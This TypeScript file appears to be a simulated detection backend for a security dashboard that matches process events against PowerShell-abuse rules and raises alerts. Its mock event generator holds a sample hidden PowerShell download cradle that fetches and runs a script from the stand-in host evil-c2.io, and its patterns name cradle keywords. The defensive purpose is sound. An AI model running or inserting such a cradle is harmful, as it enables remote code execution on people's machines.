
import { ProcessEvent, Alert, Severity, CaseNote, Artifact } from '../types';

// Detection Logic Constants
const PATTERNS = {
  ENCODED: /-(enc|encodedcommand)\s+[a-z0-9+/=]{10,}/i,
  STEALTH: /-(noprofile|nop)\s+.*-windowstyle\s+hidden/i,
  CRADLE: /(iex|invoke-expression|downloadstring|webclient|downloadfile)/i,
  B64_LONG: /[a-z0-9+/=]{100,}/i,
  OFFICE: /(winword|excel|outlook|powerpnt)\.exe/i
};

class SimulatedBackend {
  private events: ProcessEvent[] = [];
  private alerts: Alert[] = [];
  private notes: CaseNote[] = [];
  private artifacts: Artifact[] = [];
  private listeners: (() => void)[] = [];

  constructor() {
    this.loadState();
    // Start generating mock telemetry if empty
    if (this.events.length === 0) {
      this.startCollector();
    }
    
    // Seed some initial data if empty
    if (this.notes.length === 0) {
      this.notes = [
        { id: 'n1', timestamp: '10:05:00', author: 'J. Harkness', text: 'Case initialized after detection of PowerShell download cradle.' },
      ];
    }
  }

  private loadState() {
    const savedAlerts = localStorage.getItem('sentinel_alerts');
    if (savedAlerts) this.alerts = JSON.parse(savedAlerts);

    const savedNotes = localStorage.getItem('sentinel_notes');
    if (savedNotes) this.notes = JSON.parse(savedNotes);

    const savedArtifacts = localStorage.getItem('sentinel_artifacts');
    if (savedArtifacts) this.artifacts = JSON.parse(savedArtifacts);
  }

  private saveState() {
    localStorage.setItem('sentinel_alerts', JSON.stringify(this.alerts));
    localStorage.setItem('sentinel_notes', JSON.stringify(this.notes));
    localStorage.setItem('sentinel_artifacts', JSON.stringify(this.artifacts));
    this.notify();
  }

  public subscribe(callback: () => void) {
    this.listeners.push(callback);
    return () => {
      this.listeners = this.listeners.filter(l => l !== callback);
    };
  }

  private notify() {
    this.listeners.forEach(l => l());
  }

  public getAlerts() {
    return [...this.alerts].reverse();
  }

  public getEvents() {
    return [...this.events].reverse();
  }

  public getNotes() {
    return [...this.notes].reverse();
  }

  public getArtifacts() {
    return [...this.artifacts].reverse();
  }

  public addNote(text: string) {
    const note: CaseNote = {
      id: `note-${Date.now()}`,
      timestamp: new Date().toLocaleTimeString(),
      author: 'J. Harkness',
      text
    };
    this.notes.push(note);
    this.saveState();
  }

  public addArtifact(name: string, type: string) {
    const artifact: Artifact = {
      id: `art-${Date.now()}`,
      timestamp: new Date().toLocaleTimeString(),
      name,
      type
    };
    this.artifacts.push(artifact);
    this.saveState();
  }

  public acknowledgeAlert(id: string) {
    const alert = this.alerts.find(a => a.id === id);
    if (alert) {
      alert.status = 'ACK';
      this.saveState();
    }
  }

  // Ingests a raw Sysmon event and runs detections
  public ingest(event: ProcessEvent) {
    this.events.push(event);
    if (this.events.length > 200) this.events.shift();

    this.runDetections(event);
    this.notify();
  }

  private runDetections(event: ProcessEvent) {
    const cmd = event.commandLine;
    const parent = event.parentImage;

    // Rule 1: Encoded PowerShell
    if (PATTERNS.ENCODED.test(cmd)) {
      this.createAlert(event, 'Encoded PowerShell Command', Severity.CRITICAL, 95);
    }

    // Rule 2: Stealth Execution
    if (PATTERNS.STEALTH.test(cmd)) {
      this.createAlert(event, 'Stealth PowerShell Execution', Severity.HIGH, 85);
    }

    // Rule 3: Download Cradle
    if (PATTERNS.CRADLE.test(cmd)) {
      this.createAlert(event, 'Suspicious Download Cradle', Severity.CRITICAL, 90);
    }

    // Rule 4: Suspicious Parent (Office App)
    if (PATTERNS.OFFICE.test(parent)) {
      this.createAlert(event, 'Suspicious Office Child Process', Severity.HIGH, 80);
    }

    // Rule 5: Heuristic B64 Length
    if (PATTERNS.B64_LONG.test(cmd) && !this.alerts.some(a => a.eventId === event.id)) {
      this.createAlert(event, 'Heuristic: Long Base64 Block', Severity.MEDIUM, 70);
    }
  }

  private createAlert(event: ProcessEvent, rule: string, severity: Severity, confidence: number) {
    // Prevent duplicate alerts for the same event and rule
    if (this.alerts.some(a => a.eventId === event.id && a.ruleTriggered === rule)) return;

    const alert: Alert = {
      id: `AL-${Math.random().toString(36).substr(2, 6).toUpperCase()}`,
      timestamp: event.timestamp,
      hostname: event.host,
      severity,
      ruleTriggered: rule,
      confidence,
      commandLine: event.commandLine,
      processId: event.processId,
      parentProcessId: event.parentProcessId,
      processName: event.image.split('\\').pop() || event.image,
      status: 'NEW',
      eventId: event.id
    };

    this.alerts.push(alert);
    this.saveState();
  }

  private startCollector() {
    setInterval(() => {
      const isMalicious = Math.random() > 0.95;
      const event: ProcessEvent = {
        id: Math.random().toString(36).substr(2, 9),
        timestamp: new Date().toLocaleTimeString(),
        image: isMalicious ? 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe' : 'C:\\Windows\\System32\\cmd.exe',
        commandLine: isMalicious 
          ? `powershell.exe -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://evil-c2.io/p.ps1')"` 
          : 'cmd.exe /c echo "Safe check"',
        parentImage: isMalicious ? 'C:\\Program Files\\Microsoft Office\\root\\Office16\\winword.exe' : 'C:\\Windows\\explorer.exe',
        processId: Math.floor(Math.random() * 10000),
        parentProcessId: Math.floor(Math.random() * 5000),
        user: 'CORP\\J.Harkness',
        host: 'SEC-WKSTN-01'
      };
      this.ingest(event);
    }, 5000);
  }
}

export const backend = new SimulatedBackend();
